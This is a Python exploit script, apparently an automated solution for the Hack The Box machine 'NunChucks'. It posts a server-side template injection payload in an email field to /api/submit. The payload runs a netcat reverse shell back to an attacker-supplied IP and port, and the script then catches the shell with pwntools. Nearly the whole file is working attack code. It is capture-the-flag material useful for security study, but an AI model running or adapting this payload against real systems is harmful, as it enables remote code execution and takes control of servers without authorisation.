#!/usr/bin/env python3
# Author: Juan Garcia aka liandd

import sys
import signal
from termcolor import colored
import requests
from pwn import *
import argparse
import threading


# Ctrl_C
def def_handler(sig, frame):
    print(colored("[!] Saliendo...", "red"))
    sys.exit(1)


# Ctrl_C
signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    parser = argparse.ArgumentParser(description=colored(
        "AutoPwn NunChucks", "red")+colored(" HTB", "green")+" by "+colored("liandd", "red"))
    parser.add_argument('-u', '--url', dest="URL",
                        help="Machine URL to Pwn (i.e --url http://store.nunchucks.htb)")
    parser.add_argument('-i', '--ip', dest="IP",
                        help="IP address to get shell (i.e --IP 10.10.16.42)")
    parser.add_argument('-p', '--port', dest="PORT",
                        help="PORT to get shell (i.e --port 443)")

    options = parser.parse_args()
    if options.URL is None or options.IP is None or options.PORT is None:
        parser.print_help()
        print("\n\n")
        sys.exit(1)
    return options.URL, options.IP, options.PORT


def stti(URL, IP, PORT):
    main_url = URL+'/api/submit'
    data = {
        "email": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f')\")()}}@gmail.com" % (IP, PORT)}
    r = requests.post(main_url, data=data, verify=False)


def main():
    URL, IP, PORT = get_arguments()

    try:
        threading.Thread(target=stti, args=(URL, IP, PORT)).start()
    except Exception as e:
        print(colored(e, "red"))

    shell = listen(PORT, timeout=20).wait_for_connection()
    shell.interactive()


if __name__ == '__main__':
    main()
